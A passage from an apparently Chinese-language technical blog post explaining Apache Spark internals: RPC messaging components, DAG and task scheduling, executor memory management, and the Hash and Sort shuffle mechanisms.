在每次向Inbox 存入消息时，都将对应 EndpointData 加入内部ReceiverQueue 中，另外 Dispatcher创建时会启动一个单独线程进行轮询 ReceiverQueue，进行收件箱消息消费</li><li>RpcEndpointRef：RpcEndpointRef 是对远程 RpcEndpoint 的一个引用。当我们需要向一个具体的RpcEndpoint 发送消息时，一般我们需要获取到该RpcEndpoint 的引用，然后通过该应用发送消息</li><li>OutBox：指令消息发件箱。对于当前 RpcEndpoint 来说，一个目标 RpcEndpoint 对应一个发件箱，如果向多个目标RpcEndpoint 发送信息，则有多个OutBox。当消息放入Outbox 后，紧接着通过 TransportClient 将消息发送出去。消息放入发件箱以及发送过程是在同一个线程中进行</li><li>RpcAddress：表示远程的RpcEndpointRef 的地址，Host + Port</li><li>TransportClient：Netty 通信客户端，一个 OutBox 对应一个TransportClient，TransportClient不断轮询OutBox，根据 OutBox 消息的 receiver 信息，请求对应的远程 TransportServer</li><li>TransportServer：Netty 通信服务端，一个 RpcEndpoint 对应一个TransportServer，接受远程消息后调用 Dispatcher 分发消息至对应收发件箱</li></ul><h2 id="4、Spark-任务调度机制">4、Spark 任务调度机制</h2><h3 id="4-1-简介">4.1 简介</h3><p>在生产环境下，Spark 集群的部署方式一般为 YARN-Cluster 模式，之后的内核分析内容中我们默认集群的部署方式为 YARN-Cluster  模式。在上一章中我们讲解了 Spark YARN-Cluster 模式下的任务提交流程，但是我们并没有具体说明 Driver 的工作流程， Driver 线程主要是初始化 SparkContext  对象， 准备运行所需的上下文， 然后一方面保持与ApplicationMaster 的 RPC 连接，通过 ApplicationMaster 申请资源，另一方面根据用户业务逻辑开始调度任务，将任务下发到已有的空闲 Executor 上。</p><p>当 ResourceManager 向ApplicationMaster 返回Container 资源时，ApplicationMaster 就尝试在对应的Container 上启动 Executor 进程，Executor 进程起来后，会向Driver 反向注册， 注册成功后保持与 Driver 的心跳，同时等待 Driver 分发任务，当分发的任务执行完毕后， 将任务状态上报给Driver。</p><h3 id="4-2-Spark-任务调度概述">4.2 Spark 任务调度概述</h3><p>当 Driver 起来后，Driver 则会根据用户程序逻辑准备任务，并根据 Executor 资源情况逐步分发任务。在详细阐述任务调度前，首先说明下 Spark 里的几个概念。一个 Spark 应用程序包括 Job、Stage 以及 Task 三个概念：</p><ul><li><strong>Job 是以 Action 方法为界，遇到一个 Action 方法则触发一个 Job</strong></li><li><strong>Stage 是 Job 的子集，以RDD 宽依赖(即 Shuffle)为界，遇到 Shuffle 做一次划分</strong></li><li><strong>Task 是 Stage 的子集，以并行度(分区数)来衡量，分区数是多少，则有多少个 task</strong></li></ul><p>Spark 的任务调度总体来说分两路进行，一路是 Stage 级的调度，一路是 Task 级的调度，总体调度流程如下图所示</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337076.png" alt></p><p>Spark RDD 通过其Transactions 操作，形成了RDD 血缘（依赖）关系图，即 DAG，最后通过 Action 的调用，触发 Job 并调度执行，执行过程中会创建两个调度器：<strong>DAGScheduler 和 TaskScheduler</strong></p><ul><li>DAGScheduler 负责 Stage 级的调度，主要是将 job 切分成若干 Stages，并将每个 Stage打包成 TaskSet 交给 TaskScheduler 调度</li><li>TaskScheduler 负责Task 级的调度，将 DAGScheduler 给过来的TaskSet 按照指定的调度策略分发到 Executor 上执行，调度过程中 SchedulerBackend 负责提供可用资源，其中SchedulerBackend 有多种实现，分别对接不同的资源管理系统</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251337077.png" alt></p><p>Driver 初始化 SparkContext 过程中，会分别初始化 DAGScheduler、TaskScheduler、SchedulerBackend 以及 HeartbeatReceiver，并启动SchedulerBackend 以及 HeartbeatReceiver。SchedulerBackend 通过 ApplicationMaster 申请资源，并不断从 TaskScheduler 中拿到合适的Task 分发到 Executor 执行。HeartbeatReceiver 负责接收 Executor 的心跳信息，监控 Executor的存活状况，并通知到TaskScheduler。</p><h3 id="4-3-Spark-Stage-级调度">4.3 Spark Stage 级调度</h3><p>Spark 的任务调度是从 DAG 切割开始，主要是由 DAGScheduler 来完成。当遇到一个Action 操作后就会触发一个 Job 的计算，并交给 DAGScheduler 来提交。Job 由最终的 RDD 和 Action 方法封装而成；SparkContext 将 Job 交给 DAGScheduler 提交，它会根据 RDD 的血缘关系构成的 DAG 进行切分，将一个 Job 划分为若干 Stages，具体划分策略是，由最终的 RDD 不断通过依赖回溯判断父依赖是否是宽依赖，即以 Shuffle 为界，划分 Stage，窄依赖的 RDD 之间被划分到同一个 Stage 中，可以进行pipeline 式的计算。划分的 Stages 分两类，一类叫做 ResultStage ，为 DAG 最下游的 Stage ，由 Action 方法决定， 另一类叫做ShuffleMapStage，为下游 Stage 准备数据，下面看一个简单的例子 WordCount</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337078.png" alt></p><p>Job 由 saveAsTextFile 触发，该 Job 由 RDD-3 和 saveAsTextFile 方法组成，根据 RDD 之间的依赖关系从RDD-3 开始回溯搜索，直到没有依赖的 RDD-0，在回溯搜索过程中，RDD-3 依赖 RDD-2，并且是宽依赖，所以在RDD-2 和 RDD-3 之间划分 Stage，RDD-3 被划到最后一个 Stage，即 ResultStage 中，RDD-2 依赖RDD-1，RDD-1 依赖RDD-0，这些依赖都是窄依赖，所以将 RDD-0、RDD-1 和 RDD-2 划分到同一个 Stage，形成 pipeline 操作，即ShuffleMapStage 中，实际执行的时候，数据记录会一气呵成地执行 RDD-0 到 RDD-2 的转化。不难看出，其本质上是一个<strong>深度优先搜索（Depth First Search）算法</strong></p><p>一个 Stage 是否被提交，需要判断它的父 Stage 是否执行，只有在父 Stage 执行完毕才能提交当前 Stage，如果一个 Stage 没有父 Stage，那么从该 Stage 开始提交。Stage 提交时会将 Task 信息（分区信息以及方法等）序列化并被打包成 TaskSet 交给 TaskScheduler，一个Partition 对应一个 Task，另一方面 TaskScheduler 会监控 Stage 的运行状态，只有 Executor 丢失或者 Task 由于 Fetch 失败才需要重新提交失败的 Stage 以调度运行失败的任务，其他类型的 Task 失败会在TaskScheduler 的调度过程中重试。相对来说 DAGScheduler 做的事情较为简单，仅仅是在 Stage 层面上划分 DAG，提交Stage 并监控相关状态信息</p><h3 id="4-4-Spark-Task-级调度">4.4 Spark Task 级调度</h3><p>Spark Task 的调度是由 TaskScheduler 来完成，由前文可知，DAGScheduler 将 Stage 打包到交给 TaskScheTaskSetduler，TaskScheduler 会将 TaskSet 封装为 TaskSetManager 加入到调度队列中，TaskSetManager 结构如下图所示</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337079.png" alt></p><p><strong>TaskSetManager 负责监控管理同一个 Stage 中的 Tasks ， TaskScheduler 就是以TaskSetManager 为单元来调度任务</strong>。TaskScheduler 初始化后会启动 SchedulerBackend，它负责跟外界打交道， 接收 Executor 的注册信息，并维护 Executor 的状态，所以说 SchedulerBackend 是管&quot;粮食&quot; 的，同时它在启动后会定期地去&quot;询问&quot;TaskScheduler 有没有任务要运行，也就是说，它会定期地&quot;问&quot;TaskScheduler&quot;我有这么余粮，你要不要啊&quot;，TaskScheduler 在 SchedulerBackend&quot;问&quot;它的时候，会从调度队列中按照指定的调度策略选择 TaskSetManager 去调度运行</p><h4 id="1-调度策略">1 调度策略</h4><p>TaskScheduler 支持两种调度策略，<strong>一种是 FIFO，也是默认的调度策略，另一种是 FAIR</strong>。在 TaskScheduler 初始化过程中会实例化 rootPool，表示树的根节点，是 Pool 类型</p><p>如果是采用 FIFO 调度策略，则直接简单地将 TaskSetManager 按照先来先到的方式入队，出队时直接拿出最先进队的 TaskSetManager</p><p>FAIR 模式中有一个 rootPool 和多个子 Pool，各个子 Pool 中存储着所有待分配的TaskSetMagager。在 FAIR 模式中，需要先对子Pool 进行排序，再对子Pool 里面的TaskSetMagager 进行排序，因为 Pool 和 TaskSetMagager 都继承了 Schedulable 特质，因此使用相同的排序算法。排序过程的比较是基于 Fair-share 来比较的，每个要排序的对象包含三个属性:runningTasks 值（正在运行的Task 数）、minShare 值、weight 值，比较时会综合考量runningTasks值，minShare 值以及weight 值。注意，minShare、weight 的值均在公平调度配置文件 fairscheduler.xml 中被指定，调度池在构建阶段会读取此文件的相关配置</p><ul><li>如果A 对象的runningTasks大于它的minShare，B 对象的runningTasks 小于它的minShare，那么B 排在 A 前面；（runningTasks 比 minShare 小的先执行）</li><li>如果 A、B 对象的 runningTasks 都小于它们的 minShare，那么就比较 runningTasks 与minShare 的比值（minShare 使用率），谁小谁排前面；（minShare 使用率低的先执行）</li><li>如果 A、B 对象的 runningTasks 都大于它们的 minShare，那么就比较 runningTasks 与weight 的比值（权重使用率），谁小谁排前面。（权重使用率低的先执行）</li><li>如果上述比较均相等，则比较名字。</li></ul><p>整体上来说就是通过minShare和weight 这两个参数控制比较过程，可以做到让minShare 使用率和权重使用率少（实际运行 task 比例较少）的先运行。FAIR 模式排序完成后，所有的 TaskSetManager 被放入一个 ArrayBuffer 里，之后依次被取出并发送给Executor 执行。从调度队列中拿到 TaskSetManager 后，由于 TaskSetManager 封装了一个 Stage 的所有Task，并负责管理调度这些 Task，那么接下来的工作就是 TaskSetManager 按照一定的规则一个个取出 Task 给TaskScheduler，TaskScheduler 再交给 SchedulerBackend 去发到 Executor 上执行</p><h4 id="2-本地化调度">2 本地化调度</h4><p>DAGScheduler 切割 Job，划分 Stage, 通过调用 submitStage 来提交一个 Stage 对应的tasks，submitStage 会调用 submitMissingTasks，submitMissingTasks 确定每个需要计算的 task的 preferredLocations，通过调用 getPreferrdeLocations()得到 partition 的优先位置，由于一个partition 对应一个 Task，此 partition 的优先位置就是 task 的优先位置，对于要提交到TaskScheduler 的TaskSet 中的每一个 Task，该 task 优先位置与其对应的partition 对应的优先位置一致。</p><p>调度队列中拿到 TaskSetManager 后，那么接下来的工作就是 TaskSetManager 按照一定的规则一个个取出 task 给 TaskScheduler，TaskScheduler 再交给SchedulerBackend 去发到Executor 上执行。前面也提到，TaskSetManager 封装了一个 Stage 的所有Task，并负责管理调度这些Task。根据每个 Task 的优先位置，确定 Task 的 Locality 级别，Locality 一共有五种，优先级由高到低顺序</p><table><thead><tr><th><strong>名称</strong></th><th><strong>解析</strong></th></tr></thead><tbody><tr><td>PROCESS_LOCAL</td><td>进程本地化，task 和数据在同一个 Executor 中，性能最好</td></tr><tr><td>NODE_LOCAL</td><td>节点本地化，task 和数据在同一个节点中，但是 task 和数据不在同一个 Executor 中，数据需要在进程间进行传输</td></tr><tr><td>RACK_LOCAL</td><td>机架本地化，task 和数据在同一个机架的两个节点上，数据需要通过网络在节点之间进行传输</td></tr><tr><td>NO_PREF</td><td>对于 task 来说，从哪里获取都一样，没有好坏之分</td></tr><tr><td>ANY</td><td>task 和数据可以在集群的任何地方，而且不在一个机架中，性能最差</td></tr></tbody></table><p>在调度执行时，Spark 调度总是会尽量让每个 task 以最高的本地性级别来启动，当一个task 以X 本地性级别启动，但是该本地性级别对应的所有节点都没有空闲资源而启动失败， 此时并不会马上降低本地性级别启动而是在某个时间长度内再次以 X 本地性级别来启动该task，若超过限时时间则降级启动，去尝试下一个本地性级别，依次类推。</p><p>可以通过调大每个类别的最大容忍延迟时间，在等待阶段对应的 Executor 可能就会有相应的资源去执行此 task，这就在在一定程度上提到了运行性能</p><h4 id="3-失败重试与黑名单机制">3 失败重试与黑名单机制</h4><p>除了选择合适的 Task 调度运行外，还需要监控Task 的执行状态，前面也提到，与外部打交道的是 SchedulerBackend，Task 被提交到 Executor 启动执行后，Executor 会将执行状态上报给SchedulerBackend，SchedulerBackend 则告诉 TaskScheduler，TaskScheduler 找到该Task 对应的 TaskSetManager，并通知到该 TaskSetManager，这样 TaskSetManager 就知道 Task的失败与成功状态，对于失败的 Task，会记录它失败的次数，如果失败次数还没有超过最大重试次数，那么就把它放回待调度的 Task 池子中，否则整个Application 失败。</p><p>在记录 Task 失败次数过程中，会记录它上一次失败所在的 Executor Id 和Host，这样下次再调度这个 Task 时，会使用黑名单机制，避免它被调度到上一次失败的节点上，起到一定的容错作用。黑名单记录 Task 上一次失败所在的Executor Id 和 Host，以及其对应的“拉黑”时间，“拉黑”时间是指这段时间内不要再往这个节点上调度这个 Task 了</p><h2 id="5、Spark-内存管理">5、Spark 内存管理</h2><h3 id="5-1-堆内和堆外内存规划">5.1 堆内和堆外内存规划</h3><p>作为一个 JVM 进程，Executor 的内存管理建立在 JVM 的内存管理之上，Spark 对 JVM的堆内（On-heap）空间进行了更为详细的分配，以充分利用内存。同时，Spark 引入了堆外（Off-heap）内存，使之可以直接在工作节点的系统内存中开辟空间，进一步优化了内存的使用。堆内内存受到 JVM 统一管理，堆外内存是直接向操作系统进行内存的申请和释放。</p><p>堆 内 内 存 的 大 小 ， 由 Spark  应 用 程 序 启 动 时 的 <code>executor-memory</code> 或<code>spark.executor.memory</code> 参数配置。Executor 内运行的并发任务共享 JVM 堆内内存，这些任务在缓存 RDD 数据和广播（Broadcast）数据时占用的内存被规划为<strong>存储（Storage）内存</strong>， 而这些任务在执行 Shuffle 时占用的内存被规划为<strong>执行（Execution）内存</strong>，剩余的部分不做特殊规划，那些 Spark 内部的对象实例，或者用户定义的 Spark 应用程序中的对象实例，均占用剩余的空间</p><p><strong>堆外内存</strong>为了进一步优化内存的使用以及提高 Shuffle 时排序的效率，Spark 引入了堆外（Off-heap）内存，使之可以直接在工作节点的系统内存中开辟空间，存储经过序列化的二进制数据。在默认情况下堆外内存并不启用，可通过配置 <code>spark.memory.offHeap.enabled </code>参数启用， 并由 <code>spark.memory.offHeap.size</code> 参数设定堆外空间的大小。除了没有 other 空间，堆外内存与堆内内存的划分方式相同，所有运行中的并发任务共享存储内存和执行内存</p><h3 id="5-2-内存空间分配">5.2 内存空间分配</h3><p>在 Spark 最初采用的静态内存管理机制下，存储内存、执行内存和其他内存的大小在Spark 应用程序运行期间均为固定的，但用户可以应用程序启动前进行配置。Spark1.6 之后引入的<strong>统一内存管理机制</strong>，与静态内存管理的区别在于<strong>存储内存和执行内存共享同一块空间</strong>，可以动态占用对方的空闲区域，统一内存管理的堆内内存结构如图所示</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337080.png" alt></p><p>其中最重要的优化在于动态占用机制，其规则如下：</p><ul><li>设定基本的存储内存和执行内存区域（spark.storage.storageFraction 参数），该设定确定了双方各自拥有的空间的范围</li><li>双方的空间都不足时，则存储到硬盘；若己方空间不足而对方空余时，可借用对方的空间;（存储空间不足是指不足以放下一个完整的 Block）</li><li>执行内存的空间被对方占用后，可让对方将占用的部分转存到硬盘，然后&quot;归还&quot;借用的空间；</li><li>存储内存的空间被对方占用后，无法让对方&quot;归还&quot;，因为需要考虑 Shuffle 过程中的很多因素，实现起来较为复杂。</li></ul><p>凭借统一内存管理机制，Spark 在一定程度上提高了堆内和堆外内存资源的利用率，降低了开发者维护 Spark 内存的难度，但并不意味着开发者可以高枕无忧。如果存储内存的空间太大或者说缓存的数据过多，反而会导致频繁的全量垃圾回收，降低任务执行时的性能，因为缓存的 RDD 数据通常都是长期驻留内存的。所以要想充分发挥 Spark 的性能，需要开发者进一步了解存储内存和执行内存各自的管理方式和实现原理</p><h3 id="5-3-存储内存管理">5.3 存储内存管理</h3><ul><li><strong>RDD</strong> <strong>的持久化机制</strong></li><li><strong>RDD 的缓存过程</strong></li><li><strong>淘汰与落盘</strong></li></ul><h3 id="5-4-执行内存管理">5.4 执行内存管理</h3><p>执行内存主要用来存储任务在执行 Shuffle 时占用的内存，Shuffle 是按照一定规则对RDD 数据重新分区的过程，我们来看 Shuffle 的Write 和Read 两阶段对执行内存的使用：</p><p><strong>Shuffle</strong> <strong>Write</strong></p><p>若在 map 端选择普通的排序方式，会采用 ExternalSorter 进行外排，在内存中存储数据时主要占用堆内执行空间。若在 map 端选择 Tungsten 的排序方式，则采用 ShuffleExternalSorter 直接对以序列化形式存储的数据排序，在内存中存储数据时可以占用堆外或堆内执行空间，取决于用户是否开启了堆外内存以及堆外执行内存是否足够。</p><p><strong>Shuffle</strong> <strong>Read</strong></p><p>在对 reduce 端的数据进行聚合时，要将数据交给 Aggregator 处理，在内存中存储数据时占用堆内执行空间。如果需要进行最终结果排序，则要将再次将数据交给 ExternalSorter 处理，占用堆内执行空间。</p><h1>二、Spark 的两种核心 Shuffle</h1><h2 id="1、概述">1、概述</h2><h3 id="1-1-简介-v2">1.1 简介</h3><p>在 MapReduce 框架中， Shuffle 阶段是连接 Map 与 Reduce 之间的桥梁， Map 阶段通过 Shuffle 过程将数据输出到 Reduce 阶段中。由于 Shuffle 涉及磁盘的读写和网络 I/O，因此 Shuffle 性能的高低直接影响整个程序的性能。 Spark 也有 Map 阶段和 Reduce 阶段，因此也会出现 Shuffle </p><h3 id="1-2-Spark-Shuffle">1.2 Spark Shuffle</h3><p>Spark Shuffle 分为两种：一种是基于 Hash 的 Shuffle；另一种是基于 Sort 的 Shuffle。在 Spark 1.1 之前， Spark 中只实现了一种 Shuffle 方式，即基于 Hash 的 Shuffle 。在 Spark 1.1 版本中引入了基于 Sort 的 Shuffle 实现方式，并且 Spark 1.2 版本之后，默认的实现方式从基于 Hash 的 Shuffle 修改为基于 Sort 的 Shuffle 实现方式，即使用的 ShuffleManager 从默认的 hash 修改为 sort。<strong>在 Spark 2.0 版本中， Hash Shuffle 方式己经不再使用</strong>。</p><p>Spark 之所以一开始就提供基于 Hash 的 Shuffle 实现机制，其主要目的之一就是为了避免不需要的排序，大家想下 Hadoop 中的 MapReduce，是将 sort 作为固定步骤，有许多并不需要排序的任务，MapReduce 也会对其进行排序，造成了许多不必要的开销。</p><p>在基于 Hash 的 Shuffle 实现方式中，每个 Mapper 阶段的 Task 会为每个 Reduce 阶段的 Task 生成一个文件，通常会产生大量的文件（即对应为 M*R 个中间文件，其中， M 表示 Mapper 阶段的 Task 个数， R 表示 Reduce 阶段的 Task 个数） 伴随大量的随机磁盘 I/O 操作与大量的内存开销。为了缓解上述问题，在 Spark 0.8.1 版本中为基于 Hash 的 Shuffle 实现引入了 <strong>Shuffle Consolidate 机制（即文件合并机制）</strong>，将 Mapper 端生成的中间文件进行合并的处理机制。通过配置属性<code>spark.shuffie.consolidateFiles=true</code>，减少中间生成的文件数量。通过文件合并，可以将中间文件的生成方式修改为每个执行单位为每个 Reduce 阶段的 Task 生成一个文件。</p><p>基于 Hash 的 Shuffle 的实现方式中，生成的中间结果文件的个数都会依赖于 Reduce 阶段的 Task 个数，即 Reduce 端的并行度，因此文件数仍然不可控，无法真正解决问题。为了更好地解决问题，在 Spark1.1 版本引入了基于 Sort 的 Shuffle 实现方式，并且在 Spark 1.2 版本之后，默认的实现方式也从基于 Hash 的 Shuffle，修改为基于 Sort 的 Shuffle 实现方式，即使用的 ShuffleManager 从默认的 hash 修改为 sort。</p><p><strong>在基于 Sort 的 Shuffle 中，每个 Mapper 阶段的 Task 不会为每 Reduce 阶段的 Task 生成一个单独的文件，而是全部写到一个数据（Data）文件中，同时生成一个索引（Index）文件， Reduce 阶段的各个 Task 可以通过该索引文件获取相关的数据</strong>。避免产生大量文件的直接收益就是降低随机磁盘 I/0 与内存的开销。最终生成的文件个数减少到 2<em>M ，其中 M 表示 Mapper 阶段的 Task 个数，每个 Mapper 阶段的 Task 分别生成两个文件（1 个数据文件、 1 个索引文件），最终的文件个数为 M 个数据文件与 M 个索引文件。因此，最终文件个数是 2</em>M 个。</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337081.png" alt></p><h3 id="1-3-Shuffle-的核心要点">1.3 Shuffle 的核心要点</h3><p>在划分 stage 时，最后一个 stage 称为 finalStage，它本质上是一个 ResultStage 对象，前面的所有 stage 被称为 ShuffleMapStage。<strong>ShuffleMapStage 的结束伴随着 shuffle 文件的写磁盘</strong>。ResultStage 基本上对应代码中的action 算子，即将一个函数应用在 RDD 的各个partition的数据集上，意味着一个 job 的运行结束</p><h2 id="2、Hash-Shuffle-解析">2、Hash Shuffle 解析</h2><h3 id="2-1-未优化解析">2.1 未优化解析</h3><p>shuffle write 阶段，主要就是在一个 stage 结束计算之后，为了下一个 stage 可以执行 shuffle 类的算子（比如 reduceByKey），而将每个 task 处理的数据按 key 进行“划分”。所谓“划分”，就是<strong>对相同的 key 执行 hash 算法</strong>，从而将相同 key 都写入同一个磁盘文件中，而每一个磁盘文件都只属于下游 stage 的一个 task。<em>在将数据写入磁盘之前，会先将数据写入内存缓冲中，当内存缓冲填满之后，才会溢写到磁盘文件中去</em>。<em>下一个 stage 的 task 有多少个，当前 stage 的每个 task 就要创建多少份磁盘文件</em>。比如下一个 stage 总共有 100 个 task，那么当前 stage 的每个 task 都要创建 100 份磁盘文件。如果当前 stage 有 50 个 task，总共有 10 个 Executor，每个 Executor 执行 5 个 task，那么每个 Executor 上总共就要创建 500 个磁盘文件，所有 Executor 上会创建 5000 个磁盘文件。由此可见，<strong>未经优化的 shuffle write 操作所产生的磁盘文件的数量是极其惊人的</strong>。</p><p>shuffle read 阶段，通常就是一个 stage 刚开始时要做的事情。此时该 stage 的<strong>每一个 task 就需要将上一个 stage 的计算结果中的所有相同 key，从各个节点上通过网络都拉取到自己所在的节点上，然后进行 key 的聚合或连接等操作</strong>。由于 shuffle write 的过程中，map task 给下游 stage 的每个 reduce task 都创建了一个磁盘文件，因此 shuffle read 的过程中，每个 reduce task 只要从上游 stage 的所有 map task 所在节点上，拉取属于自己的那一个磁盘文件即可。</p><p>shuffle read 的拉取过程是一边拉取一边进行聚合的。每个 shuffle read task 都会有一个自己的 buffer 缓冲，<em>每次都只能拉取与 buffer 缓冲相同大小的数据</em>，然后通过内存中的一个 Map 进行聚合等操作。聚合完一批数据后，再拉取下一批数据，并放到 buffer 缓冲中进行聚合操作。以此类推，直到最后将所有数据到拉取完，并得到最终的结果。</p><h3 id="2-1-优化的-HashShuffleManager">2.1 优化的 HashShuffleManager</h3><p>为了优化 HashShuffleManager 我们可以设置一个参数：<code>spark.shuffle.consolidateFiles</code>，该参数默认值为 false，将其设置为 true 即可开启优化机制，通常来说，<strong>如果我们使用 HashShuffleManager，那么都建议开启这个选项</strong>。开启 consolidate 机制之后，在 shuffle write 过程中，task 就不是为下游 stage 的每个 task 创建一个磁盘文件了，此时会出现<strong>shuffleFileGroup</strong>的概念，<em>每个 shuffleFileGroup 会对应一批磁盘文件，磁盘文件的数量与下游 stage 的 task 数量是相同的。一个 Executor 上有多少个 cpu core，就可以并行执行多少个 task。而第一批并行执行的每个 task 都会创建一个 shuffleFileGroup，并将数据写入对应的磁盘文件内</em>。</p><p>当 Executor 的 cpu core 执行完一批 task，接着执行下一批 task 时，<em>下一批 task 就会复用之前已有的 shuffleFileGroup</em>，包括其中的磁盘文件，也就是说，此时 task 会将数据写入已有的磁盘文件中，而不会写入新的磁盘文件中。因此，<strong>consolidate 机制允许不同的 task 复用同一批磁盘文件，这样就可以有效将多个 task 的磁盘文件进行一定程度上的合并，从而大幅度减少磁盘文件的数量，进而提升 shuffle write 的性能</strong>。假设第二个 stage 有 100 个 task，第一个 stage 有 50 个 task，总共还是有 10 个 Executor（Executor CPU 个数为 1），每个 Executor 执行 5 个 task。那么原本使用未经优化的 HashShuffleManager 时，每个 Executor 会产生 500 个磁盘文件，所有 Executor 会产生 5000 个磁盘文件的。但是此时经过优化之后，每个 Executor 创建的磁盘文件的数量的计算公式为：<code>cpu core的数量 * 下一个stage的task数量</code>，也就是说，每个 Executor 此时只会创建 100 个磁盘文件，所有 Executor 只会创建 1000 个磁盘文件。</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337082.png" alt></p><h3 id="2-2-基于-Hash-的-Shuffle-机制的优缺点">2.2 基于 Hash 的 Shuffle 机制的优缺点</h3><p><strong>优点</strong>：</p><ul><li>可以省略不必要的排序开销。</li><li>避免了排序所需的内存开销。</li></ul><p><strong>缺点</strong>：</p><ul><li>生产的文件过多，会对文件系统造成压力。</li><li>大量小文件的随机读写带来一定的磁盘开销。</li><li>数据块写入时所需的缓存空间也会随之增加，对内存造成压力</li></ul><h2 id="3、SortShuffle-解析">3、SortShuffle 解析</h2><h3 id="3-1-概述">3.1 概述</h3><p>SortShuffleManager 的运行机制主要分成三种：</p><ul><li><strong>普通运行机制</strong>；</li><li><strong>bypass 运行机制</strong>，当 shuffle read task 的数量小于等于<code>spark.shuffle.sort.bypassMergeThreshold</code>参数的值时（默认为 200），就会启用 bypass 机制；</li><li><strong>Tungsten Sort 运行机制</strong>，开启此运行机制需设置配置项 <code>spark.shuffle.manager=tungsten-sort</code>。开启此项配置也不能保证就一定采用此运行机制</li></ul><h3 id="3-2-普通运行机制">3.2 普通运行机制</h3><p>在该模式下，<strong>数据会先写入一个内存数据结构中</strong>，此时根据不同的 shuffle 算子，可能选用不同的数据结构。<em>如果是 reduceByKey 这种聚合类的 shuffle 算子，那么会选用 Map 数据结构，一边通过 Map 进行聚合，一边写入内存</em>；<em>如果是 join 这种普通的 shuffle 算子，那么会选用 Array 数据结构，直接写入内存</em>。接着，每写一条数据进入内存数据结构之后，就会判断一下，是否达到了某个临界阈值。如果达到临界阈值的话，那么就会尝试将内存数据结构中的数据溢写到磁盘，然后清空内存数据结构。</p><p>在溢写到磁盘文件之前，会先根据 key 对内存数据结构中已有的数据进行排序。排序过后，会分批将数据写入磁盘文件。默认的 batch 数量是 10000 条，也就是说，排序好的数据，会以每批 1 万条数据的形式分批写入磁盘文件。写入磁盘文件是通过 Java 的 BufferedOutputStream 实现的。<strong>BufferedOutputStream 是 Java 的缓冲输出流，首先会将数据缓冲在内存中，当内存缓冲满溢之后再一次写入磁盘文件中，这样可以减少磁盘 IO 次数，提升性能</strong>。</p><p>一个 task 将所有数据写入内存数据结构的过程中，会发生多次磁盘溢写操作，也就会产生多个临时文件。最后会将之前所有的临时磁盘文件都进行合并，这就是<strong>merge 过程</strong>，此时会将之前所有临时磁盘文件中的数据读取出来，然后依次写入最终的磁盘文件之中。此外，由于一个 task 就只对应一个磁盘文件，也就意味着该 task 为下游 stage 的 task 准备的数据都在这一个文件中，因此还会单独写一份<strong>索引文件</strong>，其中标识了下游各个 task 的数据在文件中的 start offset 与 end offset。</p><p>SortShuffleManager 由于有一个磁盘文件 merge 的过程，因此大大减少了文件数量。比如第一个 stage 有 50 个 task，总共有 10 个 Executor，每个 Executor 执行 5 个 task，而第二个 stage 有 100 个 task。由于每个 task 最终只有一个磁盘文件，因此此时每个 Executor 上只有 5 个磁盘文件，所有 Executor 只有 50 个磁盘文件</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337083.png" alt></p><h3 id="3-2-bypass-运行机制">3.2 bypass 运行机制</h3><p><strong>Reducer 端任务数比较少的情况下，基于 Hash Shuffle 实现机制明显比基于 Sort Shuffle 实现机制要快，因此基于 Sort huffle 实现机制提供了一个回退方案，就是 bypass 运行机制</strong>。对于 Reducer 端任务数少于配置属性<code>spark.shuffle.sort.bypassMergeThreshold</code>设置的个数时，使用带 Hash 风格的回退计划。bypass 运行机制的触发条件如下：</p><ul><li>shuffle map task 数量小于<code>spark.shuffle.sort.bypassMergeThreshold=200</code>参数的值。</li><li>不是聚合类的 shuffle 算子（比如 reduceByKey）</li></ul><p>此时，每个 task 会为每个下游 task 都创建一个临时磁盘文件，并将数据按 key 进行 hash 然后根据 key 的 hash 值，将 key 写入对应的磁盘文件之中。当然，写入磁盘文件时也是先写入内存缓冲，缓冲写满之后再溢写到磁盘文件的。最后，同样会将所有临时磁盘文件都合并成一个磁盘文件，并创建一个单独的索引文件。该过程的磁盘写机制其实跟未经优化的 HashShuffleManager 是一模一样的，因为都要创建数量惊人的磁盘文件，只是在最后会做一个磁盘文件的合并而已。因此少量的最终磁盘文件，也让该机制相对未经优化的 HashShuffleManager 来说，shuffle read 的性能会更好。</p><p>而该机制与普通 SortShuffleManager 运行机制的不同在于：第一，磁盘写机制不同；第二，不会进行排序。也就是说，<strong>启用该机制的最大好处在于，shuffle write 过程中，不需要进行数据的排序操作</strong>，也就节省掉了这部分的性能开销。bypass 运行机制的 SortShuffleManager 工作原理如下图所示：</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337084.png" alt></p><h3 id="3-3-Tungsten-Sort-Shuffle-运行机制">3.3 Tungsten Sort Shuffle 运行机制</h3><p>基于 Tungsten Sort 的 Shuffle 实现机制主要是借助 Tungsten 项目所做的优化来高效处理 Shuffle。Spark 提供了配置属性，用于选择具体的 Shuffle 实现机制，但需要说明的是，虽然默认情况下 Spark 默认开启的是基于 SortShuffle 实现机制，但实际上，参考 Shuffle 的框架内核部分可知基于 SortShuffle 的实现机制与基于 Tungsten Sort Shuffle 实现机制都是使用 SortShuffleManager，而内部使用的具体的实现机制，是通过提供的两个方法进行判断的：**对应非基于 Tungsten Sort 时，通过 <strong><strong><code>SortShuffleWriter.shouldBypassMergeSort</code></strong></strong> 方法判断是否需要回退到 Hash 风格的 Shuffle 实现机制，当该方法返回的条件不满足时，则通过 <strong><strong><code>SortShuffleManager.canUseSerializedShuffle</code></strong></strong> 方法判断是否需要采用基于 Tungsten Sort Shuffle 实现机制，而当这两个方法返回都为 false，即都不满足对应的条件时，会自动采用普通运行机制。**因此，当设置了 <code>spark.shuffle.manager=tungsten-sort</code> 时，也不能保证就一定采用基于 Tungsten Sort 的 Shuffle 实现机制。<em>要实现 Tungsten Sort Shuffle 机制需要满足以下条件</em>：</p><ul><li>Shuffle 依赖中不带聚合操作或没有对输出进行排序的要求</li><li>Shuffle 的序列化器支持序列化值的重定位（当前仅支持 KryoSerializer Spark SQL 框架自定义的序列化器）</li><li>Shuffle 过程中的输出分区个数少于 16777216 个</li></ul><p>实际上，使用过程中还有其他一些限制，如引入 Page 形式的内存管理模型后，内部单条记录的长度不能超过 128 MB （具体内存模型可以参考 PackedRecordPointer 类）。另外，分区个数的限制也是该内存模型导致的。所以，目前使用基于 Tungsten Sort Shuffle 